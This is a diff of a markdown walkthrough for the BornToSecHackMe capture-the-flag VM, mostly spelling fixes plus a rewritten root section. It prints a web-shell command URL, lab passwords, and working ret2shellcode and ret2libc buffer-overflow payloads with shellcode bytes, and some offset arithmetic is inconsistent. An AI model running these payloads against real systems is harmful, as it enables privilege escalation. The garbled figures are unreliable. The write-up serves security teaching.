@@ -1,5 +1,5 @@
 # Introduction
-When we first boot up the VM we're greeted with a login screen. Obviously we have not been provided with any usernames / passwords so it's up to us to find a way in.
+When we first boot up the VM we're greeted with a login screen. Obviously we have not been provided with any usernames / passwords, so it's up to us to find a way in.
 
 When looking at the startup logs of the VM, we can see that apache2 has been started, we therefore know that there is a web server running on this VM.
 
@@ -171,9 +171,9 @@ https://192.168.94.8/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/pas
 lmezard:G!@M6f4Eatau{sF"
 ```
 
-*Additionally you could also start a reverse shell here, but I didn't bother with it.*
+*Additionally, you could also start a reverse shell here, but I didn't bother with it.*
 
-Finally we have new credentials! They don't work for ssh, but they do for ftp.
+Finally, we have new credentials! They don't work for ssh, but they do for ftp.
 
 # Ftp
 Alright, let's log in to FTP with the new credentials.
@@ -249,7 +249,7 @@ tcpdump: can't parse filter expression: syntax error
 
 Looks like they're not pcap files.
 
-After looking at their content, we realise that they're just regular text files with what appears to be C code, along with a number that I can only assume is the line number. For example:
+After looking at their content, we realize that they're just regular text files with what appears to be C code, along with a number that I can only assume is the line number. For example:
 ```
 ➜  ft_fun cat 44QJL.pcap 
         printf("Hahahaha Got you!!!\n"); // C code
@@ -324,7 +324,7 @@ It seems like unless I give it the right input, it will blow up. After checking 
 
 This is a translated version of the `main` function:
 
-*All the following C code is not supposed to be compiled or  be very accurate, it just gives a general idea of what the program does.*
+*All the following C code is not supposed to be compiled or be very accurate, it just gives a general idea of what the program does.*
 ```c
 *FILE infile; // Used in read_line
 
@@ -412,7 +412,7 @@ void phase_2(char *buffer)
 }
 ```
 
-The first number we provide has to be equal to 1, futhermore our input needs to have exactly 6 numbers. The next number has to be equal to the index of the loop + 1 multiplied by the previous number. For example:
+The first number we provide has to be equal to 1, furthermore our input needs to have exactly 6 numbers. The next number has to be equal to the index of the loop + 1 multiplied by the previous number. For example:
 
 ```
 current_number = 1
@@ -549,7 +549,7 @@ void phase_4(char *buffer)
 }
 ```
 
-First of all, we only need to provide one number which needs to be greater than 0. Then the `func4` function is a recursive function that returns the `first_value`'th + 1 number of the Fibonacci sequence; so the answer is `9`. On to phase 5:
+First, we only need to provide one number which needs to be greater than 0. Then the `func4` function is a recursive function that returns the `first_value`'th + 1 number of the Fibonacci sequence; so the answer is `9`. On to phase 5:
 ```c
 char array[16] = "isrveawhobpnutfg";
 
@@ -605,7 +605,7 @@ opekma, opukma, opekmq, opukmq
 
 Finally, let's move on to phase 6:
 
-*Even though I'm using ghidra, this phase is still very hard to understand. Therefore I'll need to make some assumptions, aswell as slighty modify the structure / logic.*
+*Even though I'm using ghidra, this phase is still very hard to understand. Therefore, I'll need to make some assumptions, as well as slightly modify the structure / logic.*
 ```c
 // Assuming node is defined as
 typedef struct Node {
@@ -723,14 +723,14 @@ Perfect, now we can assemble the password for the `thor` user. According to the 
 
 ![bruh](imgs/subject.png)
 
-Using the hints from the `README` to eliminate some of the possibilities (since we have multiple answers for some stages) and brute forcing the rest, we can find the password:
+Using the hints from the `README` to eliminate some possibilities (since we have multiple answers for some stages) and brute forcing the rest, we can find the password:
 ```
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 
 # User thor
 
-Alright, let's login to the `thor` user with the new password.
+Alright, lets login to the `thor` user with the new password.
 ```
 laurie@BornToSecHackMe:~$ su thor
 Password:
@@ -768,7 +768,7 @@ I've created a [python script](/scripts/turtle_solver.py) to do just that. It pr
 ![turtle4](imgs/turtle4.png)
 ![turtle5](imgs/turtle5.png)
 
-It is clearly writing `SLASH`. However it doesn't work as a password for the `zaz` user! Futhermore if we look at the end of the `turtle` file, we can see the following:
+It is clearly writing `SLASH`. However, it doesn't work as a password for the `zaz` user! Furthermore, if we look at the end of the `turtle` file, we can see the following:
 ```
 Can you digest the message? :)
 ```
@@ -780,7 +780,7 @@ The word `digest` is a hint, we need to hash the password. After using multiple 
 
 # User zaz
 
-Let's login into the `zaz` user with the password we just found.
+Lets login into the `zaz` user with the password we just found.
 ```
 thor@BornToSecHackMe:~$ su zaz
 Password:
@@ -800,7 +800,7 @@ zaz@BornToSecHackMe:~$ ./exploit_me hello
 hello
 ```
 
-Alright let's use `gdb` and analyse the assembly code:
+Alright let's use `gdb` and analyze the assembly code:
 ```
 Dump of assembler code for function main:
    # Usual setup
@@ -853,7 +853,7 @@ End of assembler dump.
 
 Here is a C equivalent of the assembly code:
 
-*The following C code is an excact translation of the assembly code, please compile it with `-fno-stack-protector` using `gcc` to get the same assembly result.*
+*The following C code is an exact translation of the assembly code, please compile it with `-fno-stack-protector` using `gcc` to get the same assembly result.*
 
 ```c
 int main(int argc, char **argv)
@@ -876,84 +876,137 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH [...]
 ```
 
-With this knowledge in mind and the fact that the original `C` file was compiled with the `-fno-stack-protector` flag, We can exploit the executable with a simple buffer overflow. In my case I'll do it with a ret2libc and a ret2shellcode.
+With this knowledge in mind and the fact that the original `C` file was compiled with the `-fno-stack-protector` flag, We can exploit the executable with a simple buffer overflow.
+
+Let's analyze the stack layout of our program:
+```bash
+(gdb) b *main+66 # Breaking before leave
+Breakpoint 1 at 0x8048436
+
+(gdb) r # Run the program
+Starting program: /home/zaz/exploit_me
+
+Breakpoint 1, 0x08048436 in main ()
+
+(gdb) info registers # Check esp and ebp addresses
+[...]
+esp            0xbffff6c0       0xbffff6c0
+ebp            0xbffff758       0xbffff758
+[...]
+```
+
+By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 152 bytes:
+```
+0xbffff728 - 0xbffff6c0 = 98 (152 in decimal)
+```	
+
+Furthermore, we can see that our buffer is located at `0x10(%esp),%eax`. Since there is 152 bytes for the stack, our buffer will therefore require 136 bytes (152 - 16) before reaching `ebp`.
+
+Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 140 bytes (136 + 4).
+
+Anything written beyond those 140 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.
+
+There are different ways to solve this challenge, we'll see two of them. First with a ret2shellcode and then the ret2libc way.
 
 ## Ret2shellcode
 
-To craft a ret2shellcode, we will use the following logic:
-```
-shellcode + padding + address of shellcode
+#### Explanation
+We opt for a shellcode designed to spawn a shell. This shellcode, taken from the [Exploit Database](https://www.exploit-db.com/exploits/41757), is compact and effective for our purpose:
+
+`\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`
+
+Our goal is to write this shellcode in memory or in an environment variable and jump to it, it will then be executed, which will spawn a shell. Executing our shellcode is basically the equivalent of running `system("/bin/sh")`.
+
+#### Exploit
+We can either feed our shellcode to the program, or we can put the shellcode in an environment variable. For convenience, we'll use the environment variable:
+```bash
+zaz@BornToSecHackMe:~$ export EXPLOIT=`python -c "print '\x90' * 200 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
 ```
 
-First of all, we need a shellcode. Here's ours:
-```
-\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+We'll write and run a C program to find the address of the environment variable:
+```c
+#include <stdio.h>
+#include <stdlib.h>
 
-// I will not go into details about the shellcode, there are plenty of resources online to learn about it
-```
-
-Then we need the size of the padding. We know that the stack was allocated 144 bytes, here's the stack layout:
-```
-ebp+16-144 ->  buffer
-ebp+12-16  ->  argv
-ebp+8-12   ->  argc
-ebp+4-8    ->  Old frame pointer (previous ebp value)
-ebp+0-4    ->  return address
+int main()
+{
+    printf("%p\n", getenv("EXPLOIT"));
+    return 0;
+}
 ```
 
-Since we want to overwrite the return address, we need to write 140 bytes of padding. We need to reduce the size of the shellcode from the padding size, so 140 - 23 = 117 bytes of padding.
-
-Finally we need to find the address of the shellcode which we can do with `gdb`. That gives us the address `0xbffff8a8`.
-
-*I'm not showing how to do it because `gdb` seems unreliable with finding the exact address of the shellcode.
-If you're having trouble finding the exact address of the shellcode, you can use the following logic instead:*
+```bash
+zaz@BornToSecHackMe:/tmp$ ./a.out
+0xbffff865
 ```
-NOP slide (size of padding) + shellcode + any address within the NOP slide
+> That address will be different for you, you'll have to change it in the payload.
 
-./exploit_me `python -c 'print("\x90" * (140 - 23) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xbf\xff\xf8\xba"[::-1])'`
+Alright, let's craft our payload:
+```
+padding + address of shellcode
 
-Here I picked the address 0xbffff8ba, which is within the NOP slide, but you can pick any address within the NOP slide.
+"\x90"*140 + "\xbf\xff\xf8\x65"
 ```
 
-Here's the final command of our original logic:
+Let's run it:
+```bash
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print("\x90"*140 + "\xbf\xff\xf8\x65"[::-1])'`
+��������������������������������������������������������������������������������������������������������������������������������������������e���
+# whoami
+root
 ```
-./exploit_me `python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "."*(140 - 23) + "\xbf\xff\xf8\xa8"[::-1])'`
-```
+
+Perfect, let's move to the other solution.
 
 ## Ret2libc
 
-To construct a ret2libc, we will use the following logic:
-```
-padding + address of system + any address + address of "/bin/sh"
+#### Explanation
+Ret2Libc (Return-to-Libc) is an exploit technique that redirects the program flow to execute existing library functions.
 
-// Although I wrote any address, if you want the program to terminate properly, you need to put the address of exit.
+A typical Ret2Libc exploit is constructed as follows:
 ```
+padding + address of system + address of exit + address of "/bin/sh"
+```
+> The address of exit is actually optional, but not providing it will cause the program to crash after executing the system function.
 
-We already know the size of the padding (*see ret2shellcode*), so we just need to find the address of system and the address of "/bin/sh".
-Let's find the address of system with `gdb`:
-```
-(gdb) p system
-$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
-```
+#### Exploit
+We, therefore, need the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. These are found using GDB:
 
-Then we need to find the address of the string "/bin/sh" with `gdb`:
+```bash
+# System
+(gdb) info function system
+0xb7e6b060  __libc_system
+0xb7e6b060  system
+[...]
 
-*Learn how to find the address of "/bin/sh" [here](https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb)*
-```
-(gdb) find 0xb7e2b000,0xc0000000,"/bin/sh"
+# Exit
+(gdb) info function exit
+0xb7e5ebe0  exit
+[...]
+
+# /bin/sh
+(gdb) info proc mappings
+[...]
+0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+[...]
+(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
 0xb7f8cc58
 1 pattern found.
 ```
 
-Therefore the final command is:
+Alright, let's craft our payload:
 ```
-./exploit_me `python -c 'print("."*140 + "\xb7\xe6\xb0\x60"[::-1] + "BEAN" + "\xb7\xf8\xcc\x58"[::-1])'`
+reminder: padding + address of system + address of exit + address of "/bin/sh"
+
+"\x90"*76 + "\xb7\xe6\xb0\x60" + "\xb7\xe5\xeb\xe0" + "\xb7\xf8\xcc\x58"
 ```
 
-# We are root
-
-After executing one of the two exploits, we are now root!
-```
+Let's run it:
+```bash
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print("\x90"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
+��������������������������������������������������������������������������������������������������������������������������������������������`�����X���
 # whoami
 root
 ```
+
+Congratulations, we've completed the challenge!
